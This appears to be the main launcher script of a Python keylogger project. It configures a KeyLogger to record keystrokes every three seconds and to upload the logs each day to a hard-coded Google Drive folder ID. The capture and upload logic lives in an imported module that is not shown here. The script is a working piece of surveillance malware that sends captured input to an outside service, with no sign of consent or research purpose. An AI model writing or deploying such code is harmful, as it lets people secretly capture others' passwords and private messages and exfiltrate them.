from key_logger import KeyLogger

FILENAME='AUTO'
SECONDS_PER_LOG = 3
GDRIVE_UPLOAD_TIME = '17:00'
GDRIVE_FOLDER_ID = '1pKaQEfl6sa2pyxSmcyY9m46EXwEtckns'

def main():
    kl = KeyLogger(
        filename=FILENAME,
        seconds_per_log=SECONDS_PER_LOG,
        gdrive_upload_time=GDRIVE_UPLOAD_TIME, 
        gdrive_folder_id=GDRIVE_FOLDER_ID
    )
    kl.start_listener()

if __name__ == '__main__':
    main()

# TODO: Check where we get extra line from